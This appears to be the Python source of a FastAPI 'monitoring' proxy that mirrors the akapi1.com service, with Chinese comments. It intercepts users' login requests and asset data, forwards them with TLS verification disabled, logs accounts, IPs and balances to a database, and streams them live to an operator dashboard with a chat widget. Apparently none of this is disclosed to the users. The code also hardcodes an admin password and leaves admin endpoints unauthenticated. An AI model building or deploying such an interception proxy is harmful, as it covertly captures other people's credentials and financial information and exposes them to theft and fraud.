# -*- coding: utf-8 -*-
"""
监控后端服务 - FastAPI
拦截登录请求并记录，提供管理API和WebSocket实时推送
"""

import asyncio
import json
import httpx
from datetime import datetime
from typing import List, Set
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, HTTPException
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn
import os
import sys

# 添加当前目录到路径
sys.path.insert(0, os.path.dirname(__file__))
from database import (
    init_db, record_login, get_all_users, get_all_ips, 
    get_recent_logins, get_user_detail, ban_user, unban_user,
    ban_ip, unban_ip, is_banned, get_ban_list, get_stats_summary,
    save_user_assets, get_user_assets, get_all_user_assets, get_asset_history
)

# 配置
ADMIN_PASSWORD = "ak-lovejjy1314"  # 管理员密码
AKAPI_URL = "https://www.akapi1.com/RPC/"  # 原始API地址

app = FastAPI(title="AK代理监控系统")

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# WebSocket连接管理 - 管理后台
class ConnectionManager:
    def __init__(self):
        self.active_connections: Set[WebSocket] = set()
    
    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.add(websocket)
    
    def disconnect(self, websocket: WebSocket):
        self.active_connections.discard(websocket)
    
    async def broadcast(self, message: dict):
        """广播消息给所有连接"""
        dead_connections = set()
        for connection in self.active_connections:
            try:
                await connection.send_json(message)
            except:
                dead_connections.add(connection)
        
        # 清理断开的连接
        self.active_connections -= dead_connections

manager = ConnectionManager()

# 在线用户管理
class OnlineUserManager:
    def __init__(self):
        self.users: dict = {}  # username -> {websocket, page, user_agent, online_time, last_heartbeat}
        self.messages: dict = {}  # username -> [messages]
    
    async def user_online(self, username: str, websocket: WebSocket, page: str, user_agent: str):
        """用户上线"""
        self.users[username] = {
            'websocket': websocket,
            'page': page,
            'user_agent': user_agent,
            'online_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'last_heartbeat': datetime.now()
        }
        # 广播给管理后台
        await manager.broadcast({
            'type': 'user_online',
            'data': {
                'username': username,
                'page': page,
                'user_agent': user_agent[:50],
                'time': self.users[username]['online_time']
            }
        })
    
    def user_offline(self, username: str):
        """用户离线"""
        if username in self.users:
            del self.users[username]
    
    def update_heartbeat(self, username: str):
        """更新心跳"""
        if username in self.users:
            self.users[username]['last_heartbeat'] = datetime.now()
    
    def get_online_users(self):
        """获取在线用户列表"""
        now = datetime.now()
        online = []
        offline = []
        for username, data in self.users.items():
            # 超过60秒没心跳视为离线
            if (now - data['last_heartbeat']).seconds > 60:
                offline.append(username)
            else:
                online.append({
                    'username': username,
                    'page': data['page'],
                    'user_agent': data['user_agent'][:50] if data['user_agent'] else '',
                    'online_time': data['online_time']
                })
        # 清理离线用户
        for u in offline:
            del self.users[u]
        return online
    
    async def send_to_user(self, username: str, content: str):
        """发送消息给用户"""
        if username in self.users:
            ws = self.users[username]['websocket']
            try:
                await ws.send_json({
                    'type': 'admin_message',
                    'content': content,
                    'time': datetime.now().strftime('%H:%M:%S')
                })
                # 保存消息历史
                if username not in self.messages:
                    self.messages[username] = []
                self.messages[username].append({
                    'content': content,
                    'is_admin': True,
                    'time': datetime.now().strftime('%H:%M:%S')
                })
                return True
            except:
                return False
        return False
    
    def save_user_message(self, username: str, content: str):
        """保存用户消息"""
        if username not in self.messages:
            self.messages[username] = []
        self.messages[username].append({
            'content': content,
            'is_admin': False,
            'time': datetime.now().strftime('%H:%M:%S')
        })
    
    def get_messages(self, username: str):
        """获取消息历史"""
        return self.messages.get(username, [])[-50:]  # 最近50条

online_manager = OnlineUserManager()

# 初始化数据库
init_db()

# ===== 数据模型 =====
class LoginRequest(BaseModel):
    account: str
    password: str
    client: str = "WEB"

class BanRequest(BaseModel):
    value: str
    reason: str = None

class AdminAuth(BaseModel):
    password: str

# ===== 登录拦截代理 =====
@app.post("/RPC/Login")
async def proxy_login(request: Request):
    """拦截登录请求，记录后转发到原始服务器"""
    
    # 获取客户端信息
    client_ip = request.client.host
    user_agent = request.headers.get("user-agent", "")
    
    # 获取请求体
    try:
        body = await request.json()
    except:
        body = {}
    
    account = body.get("account", "unknown")
    
    # 检查是否被封禁
    if is_banned(username=account, ip_address=client_ip):
        return JSONResponse({
            "Error": True,
            "Msg": "您的账号或IP已被封禁"
        })
    
    # 转发请求到原始服务器
    async with httpx.AsyncClient(verify=False, timeout=30) as client:
        try:
            response = await client.post(
                AKAPI_URL + "Login",
                json=body,
                headers={
                    "User-Agent": user_agent,
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                }
            )
            result = response.json()
        except Exception as e:
            return JSONResponse({
                "Error": True,
                "Msg": f"服务器连接失败: {str(e)}"
            })
    
    # 记录登录（无论成功失败）
    status = "success" if not result.get("Error") else "failed"
    record_login(
        username=account,
        ip_address=client_ip,
        user_agent=user_agent,
        request_path="/RPC/Login",
        status_code=200 if not result.get("Error") else 401,
        extra_data=json.dumps({"status": status, "msg": result.get("Msg", "")})
    )
    
    # 广播新登录事件
    await manager.broadcast({
        "type": "new_login",
        "data": {
            "username": account,
            "ip": client_ip,
            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "status": status,
            "user_agent": user_agent[:50] if user_agent else ""
        }
    })
    
    return JSONResponse(result)

# ===== public_IndexData 拦截 (获取用户资产) =====
@app.api_route("/RPC/public_IndexData", methods=["GET", "POST"])
async def proxy_index_data(request: Request):
    """拦截用户资产数据请求，保存后返回"""
    
    client_ip = request.client.host
    user_agent = request.headers.get("user-agent", "")
    
    # 获取请求体（可能包含用户标识）
    body = None
    if request.method == "POST":
        try:
            body = await request.json()
        except:
            body = {}
    
    # 转发请求到原始服务器
    async with httpx.AsyncClient(verify=False, timeout=30) as client:
        try:
            response = await client.request(
                method=request.method,
                url=AKAPI_URL + "public_IndexData",
                json=body,
                headers={
                    "User-Agent": user_agent,
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                }
            )
            result = response.json()
        except Exception as e:
            return JSONResponse({
                "Error": True,
                "Msg": f"服务器连接失败: {str(e)}"
            })
    
    # 如果成功获取数据，保存到数据库
    if not result.get("Error") and result.get("Data"):
        data = result["Data"]
        
        # 尝试从最近的登录记录获取用户名
        # 或者从请求中获取（如果有的话）
        username = body.get("account") if body else None
        
        if not username:
            # 从最近登录记录中查找该IP的用户
            recent = get_recent_logins(limit=10)
            for login in recent:
                if login.get("ip_address") == client_ip:
                    username = login.get("username")
                    break
        
        if username and username != "unknown":
            # 保存用户资产信息
            save_user_assets(username, data)
            
            # 广播资产更新事件
            await manager.broadcast({
                "type": "asset_update",
                "data": {
                    "username": username,
                    "ace_count": data.get("ACECount", 0),
                    "total_ace": data.get("TotalACE", 0),
                    "ep": data.get("EP", 0),
                    "weekly_money": data.get("WeeklyMoney", 0),
                    "rate": data.get("Rate", 0),
                    "honor_name": data.get("HonorName", ""),
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
            })
    
    return JSONResponse(result)

# ===== 其他RPC请求代理 =====
@app.api_route("/RPC/{path:path}", methods=["GET", "POST", "PUT", "DELETE"])
async def proxy_rpc(path: str, request: Request):
    """代理其他RPC请求"""
    
    client_ip = request.client.host
    
    # 检查IP封禁
    if is_banned(ip_address=client_ip):
        return JSONResponse({
            "Error": True,
            "Msg": "您的IP已被封禁"
        })
    
    # 获取请求体
    body = None
    if request.method in ["POST", "PUT"]:
        try:
            body = await request.json()
        except:
            body = await request.body()
    
    # 转发请求
    async with httpx.AsyncClient(verify=False, timeout=30) as client:
        try:
            response = await client.request(
                method=request.method,
                url=AKAPI_URL + path,
                json=body if isinstance(body, dict) else None,
                content=body if isinstance(body, bytes) else None,
                headers={
                    "User-Agent": request.headers.get("user-agent", ""),
                    "Content-Type": request.headers.get("content-type", "application/json"),
                    "Accept": request.headers.get("accept", "*/*")
                }
            )
            return JSONResponse(
                content=response.json() if response.headers.get("content-type", "").startswith("application/json") else response.text,
                status_code=response.status_code
            )
        except Exception as e:
            return JSONResponse({
                "Error": True,
                "Msg": f"请求失败: {str(e)}"
            }, status_code=500)

# ===== 管理API =====

@app.post("/admin/api/login")
async def admin_login(request: Request):
    """管理员登录验证"""
    data = await request.json()
    password = data.get('password')
    
    if password == ADMIN_PASSWORD:
        # 生成简单token（实际项目应使用JWT）
        import hashlib
        import time
        token = hashlib.sha256(f"{password}{time.time()}".encode()).hexdigest()[:32]
        return {"success": True, "token": token}
    else:
        return {"success": False, "message": "密码错误"}

@app.get("/admin/api/stats")
async def get_stats():
    """获取统计摘要"""
    return get_stats_summary()

@app.get("/admin/api/users")
async def get_users(limit: int = 100, offset: int = 0):
    """获取用户列表"""
    return get_all_users(limit, offset)

@app.get("/admin/api/ips")
async def get_ips(limit: int = 100, offset: int = 0):
    """获取IP列表"""
    return get_all_ips(limit, offset)

@app.get("/admin/api/logins")
async def get_logins(limit: int = 50):
    """获取最近登录记录"""
    return get_recent_logins(limit)

@app.get("/admin/api/user/{username}")
async def get_user(username: str):
    """获取用户详情"""
    user = get_user_detail(username)
    if not user:
        raise HTTPException(status_code=404, detail="用户不存在")
    return user

@app.get("/admin/api/banlist")
async def get_banlist():
    """获取封禁列表"""
    return get_ban_list()

@app.get("/admin/api/assets")
async def get_assets(limit: int = 100, offset: int = 0):
    """获取所有用户资产列表"""
    return get_all_user_assets(limit, offset)

@app.get("/admin/api/assets/{username}")
async def get_user_asset(username: str):
    """获取指定用户资产"""
    assets = get_user_assets(username)
    if not assets:
        raise HTTPException(status_code=404, detail="用户资产不存在")
    assets['history'] = get_asset_history(username)
    return assets

@app.post("/admin/api/ban/user")
async def ban_user_api(req: BanRequest):
    """封禁用户"""
    ban_user(req.value, req.reason)
    await manager.broadcast({
        "type": "user_banned",
        "data": {"username": req.value, "reason": req.reason}
    })
    return {"success": True, "message": f"用户 {req.value} 已被封禁"}

@app.post("/admin/api/unban/user")
async def unban_user_api(req: BanRequest):
    """解封用户"""
    unban_user(req.value)
    await manager.broadcast({
        "type": "user_unbanned",
        "data": {"username": req.value}
    })
    return {"success": True, "message": f"用户 {req.value} 已解封"}

@app.post("/admin/api/ban/ip")
async def ban_ip_api(req: BanRequest):
    """封禁IP"""
    ban_ip(req.value, req.reason)
    await manager.broadcast({
        "type": "ip_banned",
        "data": {"ip": req.value, "reason": req.reason}
    })
    return {"success": True, "message": f"IP {req.value} 已被封禁"}

@app.post("/admin/api/unban/ip")
async def unban_ip_api(req: BanRequest):
    """解封IP"""
    unban_ip(req.value)
    await manager.broadcast({
        "type": "ip_unbanned",
        "data": {"ip": req.value}
    })
    return {"success": True, "message": f"IP {req.value} 已解封"}

@app.post("/admin/api/change_password")
async def change_password_api(request: Request):
    """修改管理员密码"""
    global ADMIN_PASSWORD
    data = await request.json()
    current = data.get('current_password')
    new_pwd = data.get('new_password')
    
    if current != ADMIN_PASSWORD:
        return {"success": False, "message": "当前密码错误"}
    
    if not new_pwd or len(new_pwd) < 6:
        return {"success": False, "message": "新密码至少需要6位"}
    
    # 更新内存中的密码
    ADMIN_PASSWORD = new_pwd
    
    # 更新server.py文件中的密码
    try:
        import re
        server_path = os.path.join(os.path.dirname(__file__), "server.py")
        with open(server_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        content = re.sub(
            r'ADMIN_PASSWORD\s*=\s*"[^"]*"',
            f'ADMIN_PASSWORD = "{new_pwd}"',
            content
        )
        
        with open(server_path, 'w', encoding='utf-8') as f:
            f.write(content)
        
        return {"success": True, "message": "密码修改成功"}
    except Exception as e:
        return {"success": False, "message": f"保存失败: {str(e)}"}

# ===== WebSocket - 管理后台 =====
@app.websocket("/admin/ws")
async def websocket_endpoint(websocket: WebSocket):
    """WebSocket实时推送"""
    await manager.connect(websocket)
    try:
        while True:
            # 保持连接，等待消息
            data = await websocket.receive_text()
            # 可以处理客户端发来的消息
    except WebSocketDisconnect:
        manager.disconnect(websocket)

# ===== WebSocket - 用户聊天 =====
@app.websocket("/chat/ws")
async def chat_websocket(websocket: WebSocket, username: str = "visitor"):
    """用户聊天WebSocket"""
    await websocket.accept()
    
    try:
        while True:
            data = await websocket.receive_json()
            msg_type = data.get('type')
            
            if msg_type == 'online':
                # 用户上线
                await online_manager.user_online(
                    data.get('username', username),
                    websocket,
                    data.get('page', ''),
                    data.get('userAgent', '')
                )
                username = data.get('username', username)
                # 发送历史消息
                history = online_manager.get_messages(username)
                if history:
                    await websocket.send_json({
                        'type': 'history',
                        'messages': history
                    })
            
            elif msg_type == 'heartbeat':
                # 心跳
                online_manager.update_heartbeat(username)
            
            elif msg_type == 'user_message':
                # 用户发送消息
                content = data.get('content', '')
                if content:
                    online_manager.save_user_message(username, content)
                    # 广播给管理后台
                    await manager.broadcast({
                        'type': 'chat_message',
                        'data': {
                            'username': username,
                            'content': content,
                            'time': datetime.now().strftime('%H:%M:%S'),
                            'is_admin': False
                        }
                    })
            
            elif msg_type == 'offline':
                # 用户离线
                online_manager.user_offline(username)
                await manager.broadcast({
                    'type': 'user_offline',
                    'data': {'username': username}
                })
                break
                
    except WebSocketDisconnect:
        online_manager.user_offline(username)
        await manager.broadcast({
            'type': 'user_offline',
            'data': {'username': username}
        })

# ===== 在线用户API =====
@app.get("/admin/api/online")
async def get_online_users():
    """获取在线用户列表"""
    return online_manager.get_online_users()

@app.post("/admin/api/chat/send")
async def send_chat_message(request: Request):
    """发送消息给用户"""
    data = await request.json()
    username = data.get('username')
    content = data.get('content')
    
    if not username or not content:
        raise HTTPException(status_code=400, detail="缺少参数")
    
    success = await online_manager.send_to_user(username, content)
    if success:
        # 广播给管理后台
        await manager.broadcast({
            'type': 'chat_message',
            'data': {
                'username': username,
                'content': content,
                'time': datetime.now().strftime('%H:%M:%S'),
                'is_admin': True
            }
        })
        return {"success": True}
    else:
        raise HTTPException(status_code=404, detail="用户不在线")

@app.get("/admin/api/chat/history/{username}")
async def get_chat_history(username: str):
    """获取聊天历史"""
    return online_manager.get_messages(username)

# ===== 管理后台页面 =====
@app.get("/admin", response_class=HTMLResponse)
@app.get("/admin/", response_class=HTMLResponse)
async def admin_page():
    """管理后台页面"""
    html_path = os.path.join(os.path.dirname(__file__), "admin.html")
    if os.path.exists(html_path):
        with open(html_path, "r", encoding="utf-8") as f:
            return f.read()
    return "<h1>管理页面未找到</h1>"

# ===== 聊天组件JS =====
from fastapi.responses import Response

@app.get("/chat/widget.js")
async def chat_widget_js():
    """返回聊天组件JS"""
    js_path = os.path.join(os.path.dirname(__file__), "chat_widget.js")
    if os.path.exists(js_path):
        with open(js_path, "r", encoding="utf-8") as f:
            return Response(content=f.read(), media_type="application/javascript")
    return Response(content="// Chat widget not found", media_type="application/javascript")

# ===== 启动 =====
def run_server(host="0.0.0.0", port=8080):
    """启动服务器"""
    print(f"""
╔══════════════════════════════════════════════════════════╗
║           AK代理监控系统 已启动                           ║
╠══════════════════════════════════════════════════════════╣
║  管理后台: http://{host}:{port}/admin                     
║  API文档:  http://{host}:{port}/docs                      
║  WebSocket: ws://{host}:{port}/admin/ws                   
╚══════════════════════════════════════════════════════════╝
    """)
    uvicorn.run(app, host=host, port=port)

if __name__ == "__main__":
    run_server()
